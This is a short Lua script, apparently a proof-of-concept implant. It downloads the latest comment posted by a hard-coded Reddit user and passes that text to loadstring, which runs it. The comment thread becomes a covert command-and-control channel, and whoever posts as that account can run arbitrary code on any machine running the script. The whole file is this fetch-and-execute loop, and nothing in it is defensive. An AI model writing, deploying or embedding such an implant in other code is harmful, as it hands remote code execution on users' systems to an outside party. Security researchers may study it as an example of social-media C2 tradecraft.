http = require("http")
crypto = require('crypto')
socket = require('socket')
json = require('json')

local USERNAME = "Olafhartong"

function getPageContent(url)
    r, err = http.request("get", url, {headers={["User-Agent"]="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"}})
    if err ~= nil then
        return nil, err, nil
    end

    if r['status_code'] ~= 200 then
        return nl, "Got http code " .. tostring(r['status_code']), r['status_code']
    end
    return r['body'], nil
end

local function getUserPage(username, limit)
    local endPoint = "https://reddit.com/user/" .. username .. ".json"
    if limit ~= nil then
        endPoint = endPoint .. "?limit=" .. limit
    end

    local pageJson, err = getPageContent(endPoint)
    if err ~= nil then
        return nil, err
    end
    return json.decode(pageJson)
end


local function getUserComments(username)
    local comments = {}
    local data, err = getUserPage(username)
    if err then
        return nil, err
    end
    for _,v in pairs(data.data["children"]) do
        comments[#comments +1] = v.data.body
    end
    return comments, nil
end

local function getLastUserComment(username)
    local data = getUserPage(username)
    return data.data["children"][1].data.body
end

function eval(input)
    local f = loadstring(input)
    return f()
end

local commentToEval = getLastUserComment(USERNAME)
if commentToEval ~= nil then
    eval(commentToEval)
end